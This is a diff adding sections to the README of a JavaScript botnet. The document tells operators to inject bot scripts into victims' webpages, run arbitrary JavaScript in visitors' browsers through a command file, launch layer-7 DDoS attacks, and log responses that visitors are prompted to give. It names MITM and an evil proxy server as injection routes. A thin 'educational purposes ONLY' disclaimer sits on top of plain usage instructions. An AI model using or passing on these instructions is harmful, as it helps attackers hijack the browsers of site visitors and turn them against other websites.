@@ -12,6 +12,8 @@ A simple and easy to use JS Botnet
 2) Inject "bot.js" or "bot-d.js" into the victim's webpage
 
 # Commands
+You can put any JS in the "cmds.js" file and it will be executed [i.e. "alert('Hacked by Chowix40!')]
+
 ## DDoS - UNTESTED
 + Usage - cmds.php: DDoS(); url.php: URL
 + DDoSes a website via layer 7
@@ -38,3 +40,21 @@ A simple and easy to use JS Botnet
 + Prompts the user for a response
 + Later will be replaced by a chat box
 + Response logs saved in "prompt_log.txt" in the "Botnet" folder
+
+# bot.js V.S. bot-d.js
+"bot.js" is silent and won't output anything while "bot-d.js" is for debugging and outputs stuff
+
+# TODO
++ Test and optimize the DDoS function
++ Replace the promptUser funtion with a Chat funtion
++ Add more functions
+
+# How to inject
++ MITM
++ Evil proxy server
++ Any other way to inject JS files
+
+# DISCLAMER
++ This is for educational purposes ONLY
++ I or anyone else who works on this project can't or won't be held responsible for anything YOU do with this
++ Please use responsibly 
